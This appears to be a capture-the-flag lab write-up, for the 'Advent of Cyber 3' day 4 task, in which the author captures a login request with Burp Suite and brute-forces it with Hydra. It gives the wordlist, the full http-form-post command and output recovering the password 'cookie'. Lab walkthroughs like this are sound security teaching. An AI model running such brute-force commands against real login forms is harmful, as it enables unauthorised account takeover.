## We are downloading the Wordlist to our machine
```$cat /advent3/day4/wordlist ```

![cat](/Advent%20of%20Cyber%203/Screenshots/Task4/Wordlist.PNG)
```
christmas
elves!
santa
festive
joy123
myrrh!
yuletide
presents
candy
tidings
cookie
cookies
biscuits!
snowball
snowball123
```
Now we need the post request, how does it look! for that purpose we use burpsuite!
- Here's our response!

![burp](/Advent%20of%20Cyber%203/Screenshots/Task4/burp.PNG)
```
POST / HTTP/1.1
Host: 10.10.88.145
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: http://10.10.88.145
Connection: close
Referer: http://10.10.88.145/
Cookie: PHPSESSID=rr0akvdk9fpk555t5f8fdl8s75
Upgrade-Insecure-Requests: 1

username=username&password=password&submit=Login
```

Now we know how our request looks like! let try to grab that form post and pass it to Hydra (Hydra is a pre-installed tool in Kali Linux used to brute-force username and password to different services)

```
hydra -l santa -P wordlist 10.10.88.145 http-form-post "/index.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid username and password" -I
```
You might be wondering why adding a lot of those options, right?
- ```-l``` for the username!
- ```-P wordlist``` for the password wordlist that we've downloaded before!
- ```10.10.88.145``` our target!
- ```http-form-post``` We're bruteforcing a post module!
- ```^USER^``` & ```^PASS^``` are two parameters indicate what we're bruteforcing!
- ```F=Invalid username and password``` Whenever Hydra see this line when bruteforcing, it knows that the attempt failed therfore wrong credentials.
- ```-I``` Used to stop any previous hydra sessions and focus on the current one


## We get a response like this~

```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-05 01:17:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:1/p:16), ~1 try per task
[DATA] attacking http-post-form://10.10.88.145:80/index.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid username and password
```
```http
[80][http-post-form] host: 10.10.88.145   login: santa   password: cookie
```
```
1 of 1 target successfully completed, 1 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-05 01:17:02
```

## Right! We've got the password! Which is cookie!, Now let try to attempt to login

![login](/Advent%20of%20Cyber%203/Screenshots/Task4/login.PNG)
![done](/Advent%20of%20Cyber%203/Screenshots/Task4/flag.PNG)


## We've done it! Well done guys!